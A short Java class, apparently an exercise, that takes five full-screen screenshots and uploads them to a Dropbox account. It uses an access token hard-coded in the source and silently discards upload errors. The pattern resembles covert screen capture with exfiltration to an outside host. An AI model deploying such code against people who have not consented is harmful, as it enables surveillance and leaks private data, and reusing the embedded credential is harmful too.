package com.company;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class CopyThread extends Thread {
    private final static String  ACCESS_TOKEN = "u0qEwtoWYfAAAAAAAAAADFYQ74iWzPQlZ6tfs49ET58fEJKs3KIrKuhNyPKUwklb";
    public void run () {


        try {
            for (int i = 1 ; i < 6 ; i++) {
                String nameFile = "screenshot"+i;
                screenShot(nameFile);
                sendOnDropbox(nameFile);
            }
        } catch (AWTException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
public void screenShot (String nameFile)throws AWTException, IOException{

    BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

    ImageIO.write(image , "png", new File("C:/Users/user/Desktop/"+nameFile+".png"));
}
public void sendOnDropbox(String nameFile){

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
    DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
    try {
        InputStream in = new FileInputStream("C:/Users/user/Desktop/" + nameFile  + ".png");

        FileMetadata metadata = client.files().uploadBuilder("/" + nameFile + ".png").uploadAndFinish(in);
    } catch (Exception ex) {

    }

}

}
